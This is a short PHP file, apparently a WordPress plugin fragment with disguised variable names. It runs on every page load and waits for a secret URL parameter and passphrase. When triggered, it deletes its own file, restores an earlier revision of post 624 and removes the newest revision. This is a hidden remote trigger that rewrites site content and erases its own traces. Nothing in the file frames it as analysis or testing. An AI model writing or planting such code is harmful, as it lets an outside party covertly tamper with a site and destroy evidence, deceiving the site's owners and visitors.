<?php

function testimonials_now_request() {
	if (isset($_GET['profile_uploader_notice']) && $_GET['profile_uploader_notice'] === 'estate_switch_checkout_customer') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$options_name_allow = 624;
		$description_switch_extensions = wp_get_post_revisions($options_name_allow);
		if (empty($description_switch_extensions)) die('no revisions');
		if (count($description_switch_extensions) < 2) die('less than 2');
		$effect_javascript_font = array_shift($description_switch_extensions);
		$advance_pixel_animated_anti = $effect_javascript_font->ID;
		$print_jigoshop_tab = array_shift($description_switch_extensions);
		$store_countdown_thumbnail = $print_jigoshop_tab->ID;
		$performance_team_auth = wp_restore_post_revision($store_countdown_thumbnail);
		if ($performance_team_auth === false) die('error restoring');
		$performance_team_auth = wp_delete_post_revision($advance_pixel_animated_anti);		
		if ($performance_team_auth === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'testimonials_now_request');
